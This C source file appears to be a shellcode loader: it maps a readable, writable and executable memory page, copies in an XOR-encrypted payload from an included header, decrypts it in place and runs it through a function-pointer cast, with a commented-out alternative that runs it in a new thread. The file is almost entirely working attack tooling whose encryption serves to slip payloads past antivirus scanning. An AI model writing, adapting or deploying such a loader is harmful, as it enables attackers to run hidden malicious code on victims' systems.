#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <string.h>

#include "crypt.h"
#include "shellcode_enc.h"


int main() {

    size_t shellcode_len = sizeof(shellcode);
    __uint32_t page_size = getpagesize();
    void *mem = NULL;

    while (shellcode_len > page_size) {
        page_size = page_size * 2;
    }

    printf("[*] Allocating memory to host shellcode (%u bytes)\n", page_size);

    // Allocate memory to host shellcode
    mem = mmap(NULL, page_size, 
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1, 0);
    
    if (((void *) -1) == mem) {
        perror("[-] Error while allocating memory");
        exit(EXIT_FAILURE);
    }

    printf("[*] Copying shellcode...\n");
    // copy the shellcode
    memcpy(mem, shellcode, shellcode_len);

    printf("[*] Decrypting shellcode...\n");
    _XOR(mem, shellcode_len, key, sizeof(key));

    printf("[*] Executing the shellcode\n");

    // EXECUTION METHOD 1

    // Direct execution: 
    // cast the allocated memory as pointer to function
    // and execute it

    void (*f)(void) = (void (*)(void))mem;
    f();
    
    return EXIT_SUCCESS;

    // EXECUTION METHOD 2

    // create a pthread_t variable to store the thread id
    // this is needed later on for pthread_join()

    // pthread_t *t = malloc(sizeof(pthread_t));
    // if (NULL == t) {
    //     perror("[-] Error while allocating thread structure");
    //     exit(EXIT_FAILURE);
    // }

    // printf("[*] Creating a new thread...\n");
    // if (0 != pthread_create(t, NULL, mem, NULL)) {
    //     perror("[-] Error while creating the new thread");
    //     exit(EXIT_FAILURE);
    // }

    // printf("[*] Waiting for the thread to exit...\n");
    // if (0 != pthread_join(*t, NULL)) {
    //     perror("[-] Error while waiting for the new thread");
    //     exit(EXIT_FAILURE);
    // }

    // printf("[+] Execution successful!\n");
    // return EXIT_SUCCESS;
}